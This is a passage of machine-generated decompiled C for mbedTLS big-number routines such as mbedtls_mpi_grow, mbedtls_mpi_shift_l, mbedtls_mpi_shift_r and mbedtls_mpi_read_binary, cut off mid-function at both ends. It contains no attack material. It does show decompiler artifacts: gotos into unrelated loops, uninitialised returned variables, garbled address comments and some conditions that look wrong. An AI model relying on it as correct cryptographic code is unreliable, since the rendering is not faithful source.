        // 0x8056e9c
        v367 = 0;
        int32_t v387 = 0; // 0x8056ebe
        int32_t v388 = v386; // 0x8056ebe
        int32_t v389 = *(int32_t *)v386; // 0x8056eb1
        int32_t v390 = 0;
        // branch -> 0x8056eab
        while (true) {
            int32_t v391 = v389 - v390; // 0x8056eb1
            *(int32_t *)(4 * v387 + v388) = v391;
            int32_t v392 = 4 * v367; // 0x8056ec1
            int32_t * v393 = (int32_t *)(v392 + *(int32_t *)(result8 + 8)); // 0x8056ec1_0
            uint32_t v394 = *v393; // 0x8056ec1
            int32_t v395 = (int32_t)(v391 < v394) + (int32_t)(v389 < v390); // 0x8056eca
            *(int32_t *)(v368 + v392) = v391 - *v393;
            int32_t v396 = v367 + 1; // 0x8056ed2
            v367 = v396;
            if (v5 <= v396) {
                int32_t result5 = v368 + 4 * v5; // 0x8056ee2
                if (v395 == 0) {
                    // 0x8056f06
                    g3 = v3;
                    g7 = v2;
                    g5 = v1;
                    g2 = v369;
                    return result5;
                }
                int32_t * v397 = (int32_t *)result5; // 0x0394
                uint32_t v398 = *v397; // 0x8056ef2395
                *v397 = v398 - v395;
                int32_t result6 = result5 + 4; // 0x8056eff400
                int32_t v399 = v398 < v395; // 0x8056f02401
                if (v399 == 0) {
                    // 0x8056f06
                    // branch -> 0x8056f06
                    // 0x8056f06
                    g3 = v3;
                    g7 = v2;
                    g5 = v1;
                    g2 = v369;
                    return result6;
                }
                int32_t * v400 = (int32_t *)result6; // 0x8056ef2_0
                uint32_t v401 = *v400; // 0x8056ef2
                *v400 = v401 - v399;
                int32_t result7 = result6 + 4; // 0x8056eff
                while ((int32_t)(v401 < v399) != 0) {
                    // 0x8056ef0
                    v399 = v401 < v399;
                    v400 = (int32_t *)result7;
                    v401 = *v400;
                    *v400 = v401 - v399;
                    result7 += 4;
                    // continue -> 0x8056ef0
                }
                // 0x8056f06
                // branch -> 0x8056f06
                // 0x8056f06
                g3 = v3;
                g7 = v2;
                g5 = v1;
                g2 = v369;
                return result7;
            }
            // 0x8056ea8
            v387 = v396;
            v388 = v368;
            v389 = *(int32_t *)(v368 + 4 * v396);
            v390 = v395;
            // branch -> 0x8056eab
        }
    }
    // 0x8056f06
    g3 = v3;
    g7 = v2;
    g5 = v1;
    g2 = v369;
    return result8;
}

// Address range: 0x8056ff6 - 0x8056fff
int32_t function_8056ff6(int32_t a1) {
    // 0x8056ff6
    return g7;
}

// Address range: 0x8057000 - 0x80570bf
int32_t mbedtls_mpi_grow(int32_t a1, char * a2) {
    int32_t nmemb = (int32_t)a2;
    int32_t v1;
    if (a2 > (char *)0x2710) {
        // 0x8057038
        g2 = v1;
        return -16;
    }
    // 0x805701d
    if (nmemb <= *(int32_t *)(a1 + 4)) {
        // 0x8057022
        g2 = v1;
        return 0;
    }
    char * mem = calloc(nmemb, 4); // 0x805705b
    if (mem == NULL) {
        // 0x8057050
        // branch -> 0x8057038
        // 0x8057038
        g2 = v1;
        return -16;
    }
    int32_t v2 = *(int32_t *)(a1 + 8); // 0x8057066
    if (v2 != 0) {
        // 0x805706d
        memcpy(mem, (char *)v2, 4 * *(int32_t *)(a1 + 4));
        int32_t v3 = *(int32_t *)(a1 + 8); // 0x8057086
        g6 = v3;
        int32_t v4 = 4 * *(int32_t *)(a1 + 4); // 0x8057089
        if (v4 != 0) {
            *(char *)v3 = 0;
            int32_t v5 = g6 + 1; // 0x8057093
            g6 = v5;
            int32_t v6 = v4 - 1; // 0x8057096
            while (v6 != 0) {
                // 0x8057090
                *(char *)v5 = 0;
                v5 = g6 + 1;
                g6 = v5;
                v6--;
                // continue -> 0x8057090
            }
            int32_t v7 = *(int32_t *)(a1 + 8); // 0x805709b
            g6 = v7;
            v3 = v7;
            // branch -> 0x805709e
        }
        // 0x805709e
        free((char *)v3);
        // branch -> 0x80570a6
    }
    // 0x80570a6
    *(int32_t *)(a1 + 4) = nmemb;
    *(int32_t *)(a1 + 8) = (int32_t)mem;
    // branch -> 0x8057022
    // 0x8057022
    g2 = v1;
    return 0;
}

// Address range: 0x80570c0 - 0x80571bf
int32_t mbedtls_mpi_shift_l(int32_t a1, uint32_t a2) {
    int32_t v1 = g5; // 0x80570c3
    int32_t v2 = g3; // bp-16
    g5 = a1;
    int32_t v3;
    uint32_t v4 = mbedtls_mpi_bitlen(a1, v3) + a2; // 0x80570d7
    int32_t v5; // 0x805716a
    int32_t * v6; // 0x8057150_0
    int32_t * v7; // 0x8057165_0
    int32_t v8; // eax
    int32_t v9; // ebx
    int32_t v10; // edx
    int32_t v11; // esi
    uint32_t v12; // 0x805716d
    int32_t v13;
    int32_t v14; // 0x8057146
    int32_t v15;
    int32_t v16; // 0x8057114
    int32_t v17; // 0x805711448
    int32_t v18;
    int32_t v19; // 0x8057168
    int32_t v20; // 0x8057108
    int32_t v21; // 0x80570ef
    int32_t v22; // 0x8057138
    int32_t v23; // 0x8057103
    uint32_t v24; // 0x8057130
    int32_t v25; // 0x80570ef
    int32_t v26; // 0x80570fa
    int32_t v27; // 0x8057138
    int32_t v28; // 0x8057149
    int32_t v29; // 0x8057150
    uint32_t v30; // 0x80570e8
    int32_t v31; // 0x8057111
    int32_t v32; // 0x805711147
    int32_t v33; // 0x8057128
    if (v4 <= 32 * *(int32_t *)(g5 + 4)) {
        // 0x80570e5
        v30 = a2 / 32;
        v8 = v30;
        if (a2 >= 32) {
            // 0x80570ef
            v21 = g5;
            v25 = *(int32_t *)(v21 + 4);
            v10 = v25;
            if (v30 >= v25) {
                // 0x80571a9
                if (v25 != 0) {
                    // 0x80571ad
                    *(int32_t *)(*(int32_t *)(v21 + 8) - 4 + 4 * v25) = 0;
                    v33 = v10 - 1;
                    // branch -> 0x8057120
                    while (v33 != 0) {
                        // 0x8057120
                        *(int32_t *)(*(int32_t *)(v21 + 8) - 4 + 4 * v33) = 0;
                        v33--;
                        // continue -> 0x8057120
                    }
                    // 0x805712d
                    // branch -> 0x805712d
                }
                // 0x805712d
                v24 = a2 % 32;
                g6 = v24;
                if (a2 == 31) {
                    // 0x8057174
                    g3 = v2;
                    g5 = v1;
                    g2 = v13;
                    return 0;
                }
                // 0x8057138
                v22 = g5;
                v27 = v8;
                if (v27 < *(int32_t *)(v22 + 4)) {
                    // 0x805713d
                    v14 = 32 - v24;
                    v28 = *(int32_t *)(v22 + 8);
                    g6 = v28;
                    v12 = v14 % 32;
                    // branch -> 0x8057150
                    while (true) {
                        // 0x8057150
                        v6 = (int32_t *)(4 * v27 + v28);
                        v29 = *v6;
                        g4 = v14;
                        *v6 = v29 << v24;
                        v7 = (int32_t *)(4 * v8 + g6);
                        v19 = v29;
                        v11 = v19;
                        v5 = v8 + 1;
                        v8 = v5;
                        if (v12 == 0) {
                            goto lab_after_if_805716d_0_5;
                        }
                        goto lab_if_805716d_0_true_5;
                    }
                }
                // 0x8057174
                g3 = v2;
                g5 = v1;
                g2 = v13;
                return 0;
            }
            // 0x80570fa
            v26 = *(int32_t *)(v21 + 8);
            v9 = v26;
            v23 = v26 + 4 * (v25 + -1 - v30);
            g4 = v23 - 4;
            *(int32_t *)(v26 - 4 + 4 * v25) = *(int32_t *)v23;
            v32 = v10 - 1;
            v17 = v8;
            v18 = v17;
            if (v17 < v32) {
                v15 = g4;
                v20 = *(int32_t *)v15;
                g4 = v15 - 4;
                *(int32_t *)(v9 - 4 + 4 * v32) = v20;
                v31 = v32 - 1;
                v16 = v8;
                v18 = v16;
                while (v16 < v31) {
                    // 0x8057108
                    v15 = g4;
                    v20 = *(int32_t *)v15;
                    g4 = v15 - 4;
                    *(int32_t *)(v9 - 4 + 4 * v31) = v20;
                    v31--;
                    v16 = v8;
                    v18 = v16;
                    // continue -> 0x8057108
                }
                // 0x8057118
                *(int32_t *)(v9 - 4 + 4 * v18) = 0;
                v33 = v18 - 1;
                // branch -> 0x8057120
                while (v33 != 0) {
                    // 0x8057120
                    *(int32_t *)(v9 - 4 + 4 * v33) = 0;
                    v33--;
                    // continue -> 0x8057120
                }
                // 0x805712d
                // branch -> 0x805712d
                // 0x805712d
                v24 = a2 % 32;
                g6 = v24;
                if (a2 == 31) {
                    // 0x8057174
                    g3 = v2;
                    g5 = v1;
                    g2 = v13;
                    return 0;
                }
                // 0x8057138
                v22 = g5;
                v27 = v8;
                if (v27 < *(int32_t *)(v22 + 4)) {
                    // 0x805713d
                    v14 = 32 - v24;
                    v28 = *(int32_t *)(v22 + 8);
                    g6 = v28;
                    v12 = v14 % 32;
                    // branch -> 0x8057150
                    while (true) {
                        // 0x8057150
                        v6 = (int32_t *)(4 * v27 + v28);
                        v29 = *v6;
                        g4 = v14;
                        *v6 = v29 << v24;
                        v7 = (int32_t *)(4 * v8 + g6);
                        v19 = v29;
                        v11 = v19;
                        v5 = v8 + 1;
                        v8 = v5;
                        if (v12 == 0) {
                            goto lab_after_if_805716d_0_5;
                        }
                        goto lab_if_805716d_0_true_5;
                    }
                }
                // 0x8057174
                g3 = v2;
                g5 = v1;
                g2 = v13;
                return 0;
            }
            // 0x8057118
            *(int32_t *)(v9 - 4 + 4 * v18) = 0;
            v33 = v18 - 1;
            // branch -> 0x8057120
            while (v33 != 0) {
                // 0x8057120
                *(int32_t *)(v9 - 4 + 4 * v33) = 0;
                v33--;
                // continue -> 0x8057120
            }
            // 0x805712d
            // branch -> 0x805712d
        }
        // 0x805712d
        v24 = a2 % 32;
        g6 = v24;
        if (a2 == 31) {
            // 0x8057174
            g3 = v2;
            g5 = v1;
            g2 = v13;
            return 0;
        }
        // 0x8057138
        v22 = g5;
        v27 = v8;
        if (v27 < *(int32_t *)(v22 + 4)) {
            // 0x805713d
            v14 = 32 - v24;
            v28 = *(int32_t *)(v22 + 8);
            g6 = v28;
            v12 = v14 % 32;
            // branch -> 0x8057150
            while (true) {
                // 0x8057150
                v6 = (int32_t *)(4 * v27 + v28);
                v29 = *v6;
                g4 = v14;
                *v6 = v29 << v24;
                v7 = (int32_t *)(4 * v8 + g6);
                v19 = v29;
                v11 = v19;
                v5 = v8 + 1;
                v8 = v5;
                if (v12 == 0) {
                    goto lab_after_if_805716d_0_5;
                }
                goto lab_if_805716d_0_true_5;
            }
        }
        // 0x8057174
        g3 = v2;
        g5 = v1;
        g2 = v13;
        return 0;
    }
    int32_t v34 = v4 % 32 != 0; // 0x8057184
    g6 = v34;
    int32_t result = mbedtls_mpi_grow(g5, (char *)(v34 + v4 / 32)); // 0x8057194
    if (result != 0) {
        // 0x80571a1
        g3 = v2;
        g5 = v1;
        g2 = v13;
        return result;
    }
    // 0x80570e5
    v30 = a2 / 32;
    v8 = v30;
    if (a2 >= 32) {
        // 0x80570ef
        v21 = g5;
        v25 = *(int32_t *)(v21 + 4);
        v10 = v25;
        if (v30 >= v25) {
            // 0x80571a9
            if (v25 != 0) {
                // 0x80571ad
                *(int32_t *)(*(int32_t *)(v21 + 8) - 4 + 4 * v25) = 0;
                v33 = v10 - 1;
                // branch -> 0x8057120
                while (v33 != 0) {
                    // 0x8057120
                    *(int32_t *)(*(int32_t *)(v21 + 8) - 4 + 4 * v33) = 0;
                    v33--;
                    // continue -> 0x8057120
                }
                // 0x805712d
                // branch -> 0x805712d
            }
            // 0x805712d
            v24 = a2 % 32;
            g6 = v24;
            if (a2 == 31) {
                // 0x8057174
                g3 = v2;
                g5 = v1;
                g2 = v13;
                return 0;
            }
            // 0x8057138
            v22 = g5;
            v27 = v8;
            if (v27 < *(int32_t *)(v22 + 4)) {
                // 0x805713d
                v14 = 32 - v24;
                v28 = *(int32_t *)(v22 + 8);
                g6 = v28;
                v12 = v14 % 32;
                // branch -> 0x8057150
                while (true) {
                    // 0x8057150
                    v6 = (int32_t *)(4 * v27 + v28);
                    v29 = *v6;
                    g4 = v14;
                    *v6 = v29 << v24;
                    v7 = (int32_t *)(4 * v8 + g6);
                    v19 = v29;
                    v11 = v19;
                    v5 = v8 + 1;
                    v8 = v5;
                    if (v12 == 0) {
                        goto lab_after_if_805716d_0_5;
                    }
                    goto lab_if_805716d_0_true_5;
                }
            }
            // 0x8057174
            g3 = v2;
            g5 = v1;
            g2 = v13;
            return 0;
        }
        // 0x80570fa
        v26 = *(int32_t *)(v21 + 8);
        v9 = v26;
        v23 = v26 + 4 * (v25 + -1 - v30);
        g4 = v23 - 4;
        *(int32_t *)(v26 - 4 + 4 * v25) = *(int32_t *)v23;
        v32 = v10 - 1;
        v17 = v8;
        v18 = v17;
        if (v17 < v32) {
            v15 = g4;
            v20 = *(int32_t *)v15;
            g4 = v15 - 4;
            *(int32_t *)(v9 - 4 + 4 * v32) = v20;
            v31 = v32 - 1;
            v16 = v8;
            v18 = v16;
            while (v16 < v31) {
                // 0x8057108
                v15 = g4;
                v20 = *(int32_t *)v15;
                g4 = v15 - 4;
                *(int32_t *)(v9 - 4 + 4 * v31) = v20;
                v31--;
                v16 = v8;
                v18 = v16;
                // continue -> 0x8057108
            }
            // 0x8057118
            *(int32_t *)(v9 - 4 + 4 * v18) = 0;
            v33 = v18 - 1;
            // branch -> 0x8057120
            while (v33 != 0) {
                // 0x8057120
                *(int32_t *)(v9 - 4 + 4 * v33) = 0;
                v33--;
                // continue -> 0x8057120
            }
            // 0x805712d
            // branch -> 0x805712d
            // 0x805712d
            v24 = a2 % 32;
            g6 = v24;
            if (a2 == 31) {
                // 0x8057174
                g3 = v2;
                g5 = v1;
                g2 = v13;
                return 0;
            }
            // 0x8057138
            v22 = g5;
            v27 = v8;
            if (v27 < *(int32_t *)(v22 + 4)) {
                // 0x805713d
                v11 = 0;
                v14 = 32 - v24;
                v28 = *(int32_t *)(v22 + 8);
                g6 = v28;
                v12 = v14 % 32;
                int32_t v35 = v27; // 0x805715f
                int32_t v36 = v28; // 0x805715f
                // branch -> 0x8057150
                while (true) {
                    // 0x8057150
                    v6 = (int32_t *)(4 * v35 + v36);
                    v29 = *v6;
                    g4 = v14;
                    *v6 = v29 << v24;
                    v7 = (int32_t *)(4 * v8 + g6);
                    *v7 = v11 | *v7;
                    v19 = v29;
                    v11 = v19;
                    v5 = v8 + 1;
                    v8 = v5;
                    if (v12 != 0) {
                      lab_if_805716d_0_true_5:
                        // if_805716d_0_true
                        v11 = v19 >> v12;
                        // branch -> after_if_805716d_0
                    }
                  lab_after_if_805716d_0_5:
                    // after_if_805716d_0
                    if (*(int32_t *)(v22 + 4) <= v5) {
                        // 0x8057174
                        // branch -> 0x8057174
                        // 0x8057174
                        g3 = v2;
                        g5 = v1;
                        g2 = v13;
                        return 0;
                    }
                    // after_if_805716d_0.dec_label_pc_8057150_crit_edge
                    v35 = v5;
                    v36 = g6;
                    // branch -> 0x8057150
                }
            }
            // 0x8057174
            g3 = v2;
            g5 = v1;
            g2 = v13;
            return 0;
        }
        // 0x8057118
        *(int32_t *)(v9 - 4 + 4 * v18) = 0;
        v33 = v18 - 1;
        // branch -> 0x8057120
        while (v33 != 0) {
            // 0x8057120
            *(int32_t *)(v9 - 4 + 4 * v33) = 0;
            v33--;
            // continue -> 0x8057120
        }
        // 0x805712d
        // branch -> 0x805712d
    }
    // 0x805712d
    v24 = a2 % 32;
    g6 = v24;
    if (a2 == 31) {
        // 0x8057174
        g3 = v2;
        g5 = v1;
        g2 = v13;
        return 0;
    }
    // 0x8057138
    v22 = g5;
    v27 = v8;
    if (v27 < *(int32_t *)(v22 + 4)) {
        // 0x805713d
        v14 = 32 - v24;
        v28 = *(int32_t *)(v22 + 8);
        g6 = v28;
        v12 = v14 % 32;
        // branch -> 0x8057150
        while (true) {
            // 0x8057150
            v6 = (int32_t *)(4 * v27 + v28);
            v29 = *v6;
            g4 = v14;
            *v6 = v29 << v24;
            v7 = (int32_t *)(4 * v8 + g6);
            v19 = v29;
            v11 = v19;
            v5 = v8 + 1;
            v8 = v5;
            if (v12 == 0) {
                goto lab_after_if_805716d_0_5;
            }
            goto lab_if_805716d_0_true_5;
        }
    }
    // 0x8057174
    g3 = v2;
    g5 = v1;
    g2 = v13;
    return 0;
}

// Address range: 0x80571c0 - 0x805724f
int32_t mbedtls_mpi_set_bit(int32_t a1, uint32_t a2, uint32_t a3) {
    // 0x80571c0
    g1 = -4;
    int32_t v1 = g3; // 0x80571cb
    int32_t v2 = a3 % 256; // 0x80571ce
    g3 = v2;
    int32_t v3 = g7; // 0x80571d2
    g7 = a2;
    int32_t v4 = g5; // 0x80571d8
    g5 = a1;
    int32_t v5;
    if (v2 >= 2) {
        // 0x80571e3
        g3 = v1;
        g7 = v3;
        g5 = v4;
        g2 = v5;
        return -4;
    }
    int32_t v6 = a2 / 32; // 0x80571f5
    g6 = v6;
    int32_t v7; // 0x8057229
    int32_t * v8; // 0x8057239_0
    int32_t * v9; // 0x805723d_0
    uint32_t v10; // 0x805723b
    int32_t v11; // 0x805723b
    int32_t v12; // 0x8057239
    int32_t v13; // 0x805723d
    uint32_t v14; // 0x805722c
    int32_t v15; // 0x8057237
    if (32 * *(int32_t *)(a1 + 4) > a2) {
        // 0x8057220
        v7 = *(int32_t *)(a1 + 8) + 4 * v6;
        v14 = a2 % 32;
        g4 = v14;
        g6 = -2;
        v12 = -2;
        if (v14 != 0) {
            // if_8057237_0_true
            v15 = 0xfffffffe >> 32 - v14 | -2 << v14;
            g6 = v15;
            v12 = v15;
            // branch -> after_if_8057237_0
        }
        // after_if_8057237_0
        v8 = (int32_t *)v7;
        *v8 = *v8 & v12;
        v10 = g4 % 32;
        v11 = v2 % 256;
        if (v10 != 0) {
            // if_805723b_0_true
            v13 = v11 << v10;
            // branch -> after_if_805723b_0
        } else {
            v13 = v11;
        }
        // after_if_805723b_0
        v9 = (int32_t *)v7;
        *v9 = *v9 | v13;
        g1 = 0;
        g3 = v1;
        g7 = v3;
        g5 = v4;
        g2 = v5;
        return 0;
    }
    // 0x80571ff
    g1 = 0;
    if (v2 == 0) {
        // 0x80571e3
        g3 = v1;
        g7 = v3;
        g5 = v4;
        g2 = v5;
        return 0;
    }
    int32_t result = mbedtls_mpi_grow(a1, (char *)(v6 + 1)); // 0x8057212
    g1 = result;
    g6 = v6;
    if (result != 0) {
        // 0x8057205
        // branch -> 0x80571e3
        // 0x80571e3
        g3 = v1;
        g7 = v3;
        g5 = v4;
        g2 = v5;
        return result;
    }
    // 0x8057205
    // branch -> 0x8057220
    // 0x8057220
    v7 = *(int32_t *)(g5 + 8) + 4 * v6;
    v14 = g7 % 32;
    g4 = v14;
    g6 = -2;
    v12 = -2;
    if (v14 != 0) {
        // if_8057237_0_true
        v15 = 0xfffffffe >> 32 - v14 | -2 << v14;
        g6 = v15;
        v12 = v15;
        // branch -> after_if_8057237_0
    }
    // after_if_8057237_0
    v8 = (int32_t *)v7;
    *v8 = *v8 & v12;
    v10 = g4 % 32;
    v11 = g3 % 256;
    if (v10 != 0) {
        // if_805723b_0_true
        v13 = v11 << v10;
        // branch -> after_if_805723b_0
    } else {
        v13 = v11;
    }
    // after_if_805723b_0
    v9 = (int32_t *)v7;
    *v9 = *v9 | v13;
    g1 = 0;
    g3 = v1;
    g7 = v3;
    g5 = v4;
    g2 = v5;
    return 0;
}

// Address range: 0x8057250 - 0x80572bf
int32_t mbedtls_mpi_lset(char * a1, int32_t a2) {
    int32_t v1 = g3; // 0x8057256
    int32_t v2 = (int32_t)a1;
    g3 = v2;
    int32_t v3 = g5; // 0x805725f
    g5 = a2;
    int32_t result = mbedtls_mpi_grow(v2, (char *)1); // 0x8057270
    if (result == 0) {
        // 0x805727b
        memset((char *)*(int32_t *)(g3 + 8), 0, 4 * *(int32_t *)(g3 + 4));
        int32_t v4 = *(int32_t *)(g3 + 8); // 0x8057298
        g6 = v4;
        int32_t v5 = g5 >> 31; // 0x805729d
        *(int32_t *)v4 = v5 ^ g5;
        int32_t * v6 = (int32_t *)g6; // 0x80572a4_0
        *v6 = *v6 - v5;
        *(int32_t *)g3 = v5 | 1;
        // branch -> 0x80572ab
    }
    // 0x80572ab
    g3 = v1;
    g5 = v3;
    int32_t v7;
    g2 = v7;
    return result;
}

// Address range: 0x80572c0 - 0x805739f
int32_t mbedtls_mpi_shift_r(int32_t a1, uint32_t a2) {
    int32_t v1 = g5; // 0x80572c3
    int32_t v2 = g7; // 0x80572c4
    int32_t v3 = g3; // 0x80572c5
    g4 = a1;
    uint32_t v4 = *(int32_t *)(a1 + 4); // 0x80572cf
    int32_t v5 = a2 / 32; // 0x80572d4
    int32_t v6;
    int32_t v7;
    if (v5 > v4) {
        // 0x8057388
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return mbedtls_mpi_lset((char *)v7, v6);
    }
    uint32_t v8 = a2 % 32; // 0x80572df
    if (a2 != 31) {
        // 0x8057380
        if (v5 == v4) {
            // 0x8057388
            g3 = v3;
            g7 = v2;
            g5 = v1;
            return mbedtls_mpi_lset((char *)v7, v6);
        }
    }
    int32_t v9 = a1; // 0x8057341
    int32_t * v10; // 0x8057350_0
    int32_t * v11; // 0x8057364_0
    int32_t v12; // eax
    int32_t v13; // esi
    int32_t v14; // 0x8057346
    int32_t v15; // 0x8057335
    int32_t v16; // 0x8057341
    uint32_t v17; // 0x8057350
    int32_t v18; // 0x805736c
    if (a2 >= 32) {
        // 0x80572f3
        v12 = 0;
        int32_t v19 = a1; // 0x805731a
        int32_t v20 = v4; // 0x8057316
        int32_t v21 = 0; // 0x8057316
        if (v5 != v4) {
            int32_t v22 = *(int32_t *)(a1 + 8); // 0x80572f9
            g6 = v22;
            v12 = 1;
            *(int32_t *)v22 = *(int32_t *)(4 * v5 + v22);
            int32_t v23 = g4; // 0x8057308
            int32_t v24 = *(int32_t *)(v23 + 4); // 0x8057308
            int32_t v25 = g6 + 4; // 0x805730b
            g6 = v25;
            int32_t v26 = v12; // 0x8057312
            // branch -> 0x8057300
            while (v24 - v5 > v26) {
                // 0x8057300
                v22 = v25;
                v12 = v26 + 1;
                *(int32_t *)v22 = *(int32_t *)(4 * v5 + v22);
                v23 = g4;
                v24 = *(int32_t *)(v23 + 4);
                v25 = g6 + 4;
                g6 = v25;
                v26 = v12;
                // continue -> 0x8057300
            }
            // 0x8057316
            v19 = v23;
            v20 = v24;
            v21 = v26;
            // branch -> 0x8057316
        }
        // 0x8057316
        if (v21 < v20) {
            int32_t v27 = *(int32_t *)(v19 + 8); // 0x805731a
            g6 = v27;
            *(int32_t *)(4 * v21 + v27) = 0;
            int32_t v28 = v12 + 1; // 0x805732743
            int32_t v29 = g4; // 0x805732a44
            if (*(int32_t *)(v29 + 4) > v28) {
                *(int32_t *)(4 * v28 + g6) = 0;
                int32_t v30 = v28 + 1; // 0x8057327
                int32_t v31 = g4; // 0x805732a
                while (*(int32_t *)(v31 + 4) > v30) {
                    // 0x8057320
                    *(int32_t *)(4 * v30 + g6) = 0;
                    v30++;
                    v31 = g4;
                    // continue -> 0x8057320
                }
                // 0x805732f
                v9 = v31;
                // branch -> 0x805732f
                // 0x805732f
                if (v8 == 0) {
                    // 0x8057371
                    g3 = v3;
                    g7 = v2;
                    g5 = v1;
                    g2 = v7;
                    return 0;
                }
                // 0x8057335
                v15 = *(int32_t *)(v9 + 4);
                v12 = v15;
                if (v15 == 0) {
                    // 0x8057371
                    g3 = v3;
                    g7 = v2;
                    g5 = v1;
                    g2 = v7;
                    return 0;
                }
                // 0x805733c
                v16 = *(int32_t *)(v9 + 8);
                g6 = v16;
                v13 = 0;
                v14 = 32 - v8;
                int32_t v32 = v15; // 0x8057360
                int32_t v33 = v16; // 0x8057360
                // branch -> if_805735a_0_true
                while (true) {
                    // if_805735a_0_true
                    v10 = (int32_t *)(v33 - 4 + 4 * v32);
                    v17 = *v10;
                    g4 = v14;
                    *v10 = v17 >> v8;
                    v11 = (int32_t *)(g6 - 4 + 4 * v12);
                    *v11 = v13 | *v11;
                    v13 = v17 << v14 % 32;
                    v18 = v12 - 1;
                    v12 = v18;
                    if (v18 == 0) {
                        // 0x8057371
                        // branch -> 0x8057371
                        // 0x8057371
                        g3 = v3;
                        g7 = v2;
                        g5 = v1;
                        g2 = v7;
                        return 0;
                    }
                  lab_after_if_805736a_0_dec_label_pc_8057350_crit_edge:
                    // after_if_805736a_0.dec_label_pc_8057350_crit_edge
                    v32 = v18;
                    v33 = g6;
                    // branch -> if_805735a_0_true
                }
            }
            // 0x805732f
            v9 = v29;
            // branch -> 0x805732f
        } else {
            v9 = v19;
        }
    }
    // 0x805732f
    if (v8 == 0) {
        // 0x8057371
        g3 = v3;
        g7 = v2;
        g5 = v1;
        g2 = v7;
        return 0;
    }
    // 0x8057335
    v15 = *(int32_t *)(v9 + 4);
    v12 = v15;
    if (v15 == 0) {
        // 0x8057371
        g3 = v3;
        g7 = v2;
        g5 = v1;
        g2 = v7;
        return 0;
    }
    // 0x805733c
    v16 = *(int32_t *)(v9 + 8);
    g6 = v16;
    v14 = 32 - v8;
    // branch -> if_805735a_0_true
    while (true) {
        // if_805735a_0_true
        v10 = (int32_t *)(v16 - 4 + 4 * v15);
        v17 = *v10;
        g4 = v14;
        *v10 = v17 >> v8;
        v11 = (int32_t *)(g6 - 4 + 4 * v12);
        v13 = v17 << v14 % 32;
        v18 = v12 - 1;
        v12 = v18;
        if (v18 != 0) {
            goto lab_after_if_805736a_0_dec_label_pc_8057350_crit_edge;
        }
        // 0x8057371
        // branch -> 0x8057371
        // 0x8057371
        g3 = v3;
        g7 = v2;
        g5 = v1;
        g2 = v7;
        return 0;
    }
}

// Address range: 0x80573a0 - 0x805746f
int32_t mbedtls_mpi_read_binary(int32_t a1, char * a2, uint32_t a3) {
    int32_t v1 = g5; // 0x80573a3
    int32_t v2 = g7; // 0x80573a4
    int32_t v3 = g3; // 0x80573a5
    g5 = a3;
    int32_t v4 = (int32_t)a2;
    g7 = v4;
    int32_t v5; // 0x80573f0
    int32_t v6; // 0x8057416
    int32_t v7;
    uint32_t v8; // 0x80573d9
    int32_t v9; // 0x8057422
    uint32_t v10; // 0x8057422
    int32_t v11; // 0x8057447
    int32_t v12; // 0x805744d
    int32_t v13; // 0x80573dd
    uint32_t v14; // 0x805744a
    int32_t result; // 0x805745d22
    int32_t v15; // 0x8057450
    int32_t v16; // 0x8057455
    int32_t v17; // 0x8057440
    if (a3 != 0) {
        // 0x80573b7
        if (*a2 == 0) {
            int32_t v18 = 0; // 0x80573ce
            while (true) {
                int32_t v19 = v18 + 1; // 0x80573ce
                g3 = v19;
                int32_t v20 = v19; // 0x80573d9
                if (v19 < a3) {
                    // 0x80573c8
                    if (*(char *)(v19 + v4) != 0) {
                        // break -> 0x80573d5
                        break;
                    }
                    v18 = v19;
                    // continue -> 0x80573ce
                    continue;
                }
                // 0x80573d5
                v8 = a3 - v20;
                v13 = v8 % 4 != 0;
                g6 = v13;
                v5 = mbedtls_mpi_grow(a1, (char *)(v13 + v8 / 4));
                result = v5;
                if (v5 == 0) {
                    // 0x8057408
                    g4 = a1;
                    v6 = mbedtls_mpi_lset((char *)a1, 0);
                    if (v6 == 0) {
                        // 0x8057422
                        v9 = g5;
                        v10 = g3;
                        if (v9 > v10) {
                            // 0x8057426
                            v11 = v9;
                            v12 = 0;
                            // branch -> 0x8057438
                            while (true) {
                                // 0x8057438
                                v17 = (int32_t)*(char *)(g7 - 1 + v11);
                                g6 = v17;
                                v14 = v12 % 4;
                                v15 = 8 * v14;
                                g4 = v15;
                                v16 = v17;
                                if (v14 != 0) {
                                  lab_if_8057453_0_true_2:;
                                    int32_t v21 = v17 << v15; // 0x8057453
                                    g6 = v21;
                                    v16 = v21;
                                    // branch -> after_if_8057453_0
                                }
                              lab_after_if_8057453_0_2:;
                                int32_t * v22 = (int32_t *)(*(int32_t *)(a1 + 8) + (v12 & -4)); // 0x8057455_0
                                *v22 = *v22 | v16;
                                int32_t v23 = v11 - 1; // 0x8057458
                                if (v23 <= v10) {
                                    // 0x805745d
                                    g3 = v3;
                                    g7 = v2;
                                    g5 = v1;
                                    g2 = v7;
                                    return 0;
                                }
                                // after_if_8057453_0.dec_label_pc_8057438_crit_edge
                                v11 = v23;
                                v12++;
                                // branch -> 0x8057438
                            }
                        } else {
                            result = 0;
                        }
                    } else {
                        result = v6;
                    }
                }
                // 0x80573fc
                g3 = v3;
                g7 = v2;
                g5 = v1;
                g2 = v7;
                return result;
            }
        }
    }
    // 0x8057468
    g3 = 0;
    // branch -> 0x80573d5
    // 0x80573d5
    v8 = a3;
    v13 = v8 % 4 != 0;
    g6 = v13;
    v5 = mbedtls_mpi_grow(a1, (char *)(v13 + v8 / 4));
    result = v5;
    if (v5 == 0) {
        // 0x8057408
        g4 = a1;
        v6 = mbedtls_mpi_lset((char *)a1, 0);
        if (v6 == 0) {
            // 0x8057422
            v9 = g5;
            v10 = g3;
            if (v9 > v10) {
                // 0x8057426
                v11 = v9;
                v12 = 0;
                // branch -> 0x8057438
                while (true) {
                    // 0x8057438
                    v17 = (int32_t)*(char *)(g7 - 1 + v11);
                    g6 = v17;
                    v14 = v12 % 4;
                    v15 = 8 * v14;
                    g4 = v15;
                    if (v14 == 0) {
                        v16 = v17;
                        goto lab_after_if_8057453_0_2;
                    }
                    goto lab_if_8057453_0_true_2;
                }
            } else {
                result = 0;
            }
        } else {
            result = v6;
        }
    }
    // 0x80573fc
    g3 = v3;
    g7 = v2;
    g5 = v1;
    g2 = v7;
    return result;
}

// Address range: 0x8057470 - 0x80574df
int32_t mbedtls_mpi_fill_random(int32_t a1, uint32_t a2, int32_t (*a3)(int32_t, int32_t, int32_t), int32_t a4) {
    int32_t v1;
    g2 = &v1;
    int32_t v2 = g3; // 0x805747e
    g3 = a2;
    int32_t v3 = g7; // 0x8057484
    g237 = a2 == 1024;
    int32_t result2 = -4; // 0x8057498_2
    if (a2 < 1025) {
        // 0x80574a0
        g1 = a4;
        int32_t v4;
        int32_t v5 = &v4; // 0x80574a3_0
        g7 = v5;
        a3(a4, v5, a2);
